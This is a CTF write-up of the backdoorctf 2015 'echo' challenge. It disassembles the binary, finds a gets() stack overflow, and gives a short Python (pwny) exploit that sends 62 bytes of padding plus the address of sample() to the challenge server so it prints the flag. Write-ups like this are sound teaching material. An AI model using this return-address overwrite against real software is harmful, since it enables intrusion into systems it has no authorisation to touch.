Title: echo
Author: doskop
Date: 2015-04-03 4:33
Tags: CTF


## Introduction

> Little Suzie started learning C. She created a simple program that echo's back whatever you input. Here is the binary file. The vampire came across this service on the internet. nc hack.bckdr.in 8002. Reports say he found a flag. See if you can get it.

Download the binary: [echo]({filename}/downloads/backdoorctf-2015/echo).

## Analysis

Let's have a quick look at the binary, shall we?

    $ readelf -hl echo|egrep "Type|GNU_STACK"
      Type:                              EXEC (Executable file)
      Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
     GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
    $ readelf -s echo|egrep "FUNC.*GLOBAL.*DEFAULT"|grep -v UND
    
       45: 080486b0     2 FUNC    GLOBAL DEFAULT   13 __libc_csu_fini
       55: 080486b4     0 FUNC    GLOBAL DEFAULT   14 _fini
       62: 08048640    97 FUNC    GLOBAL DEFAULT   13 __libc_csu_init
       65: 08048480     0 FUNC    GLOBAL DEFAULT   13 _start
       68: 0804862b    18 FUNC    GLOBAL DEFAULT   13 main
       69: 0804857d   115 FUNC    GLOBAL DEFAULT   13 sample
       74: 080483b0     0 FUNC    GLOBAL DEFAULT   11 _init
       75: 080485f0    59 FUNC    GLOBAL DEFAULT   13 test

So, no ASLR for the main executable, non executable stack and 3 exported functions: main, sample and test. Let's take a look at the disassembly of those functions. The annotations in the output are mine.

    :::asm
    $ pwny symbol-disasm echo main
    push ebp
    mov ebp,esp
    and esp,byte -0x10
    call dword 0x80485f0  ; test
    mov eax,0x0
    leave
    ret
    
    $ pwny symbol-disasm echo test
    push ebp
    mov ebp,esp
    sub esp,byte +0x58
    lea eax,[ebp-0x3a]
    mov [esp],eax
    call dword 0x80483f0  ; gets
    mov dword [esp],0x1
    call dword 0x8048420  ; sleep
    mov eax,[0x804a038]   ; stderr
    lea edx,[ebp-0x3a]
    mov [esp+0x8],edx
    mov dword [esp+0x4],0x80486db  ; "ECHO: %s\n"
    mov [esp],eax
    call dword 0x8048450  ; fprintf
    leave
    ret
    
    $ pwny symbol-disasm echo sample
    push ebp
    mov ebp,esp
    sub esp,0x88
    mov dword [esp+0x4],0x80486d0  ; "r"
    mov dword [esp],0x80486d2  ; "flag.txt"
    call dword 0x8048460  ; fopen
    mov [ebp-0xc],eax
    cmp dword [ebp-0xc],byte +0x0
    jnz 0x80485aa
    mov eax,0x1
    jmp short 0x80485ee
    jmp short 0x80485c0
    mov eax,[0x804a038]  ; stderr
    mov [esp+0x4],eax
    lea eax,[ebp-0x70]
    mov [esp],eax
    call dword 0x8048470  ; fputs
    mov eax,[ebp-0xc]
    mov [esp+0x8],eax
    mov dword [esp+0x4],0x64
    lea eax,[ebp-0x70]
    mov [esp],eax
    call dword 0x8048400  ; fgets
    test eax,eax
    jnz 0x80485ac
    mov eax,[ebp-0xc]
    mov [esp],eax
    call dword 0x8048410  ; fclose
    mov eax,0x0
    leave
    ret

## Exploitation

It seems little Suzie left us some helpful code that outputs the flag and a buffer overflow vulnerability. Little Suzie has a lot to learn. Let's write 0x3a (offset of read buffer in the stack) + 4 (saved ebp) bytes of garbage and the address of the sample function to the buffer.

    #!/usr/bin/env python
    from pwny import *
    
    binary = ELF('echo')
    target.assume(binary)
    
    #f = Flow.execute('./echo', redirect_stderr=True)
    f = Flow.connect_tcp('hack.bckdr.in', 8002)
    f.writeline('A' * 62 + P(binary.get_symbol('sample').value))
    f.read_eof(echo=True)
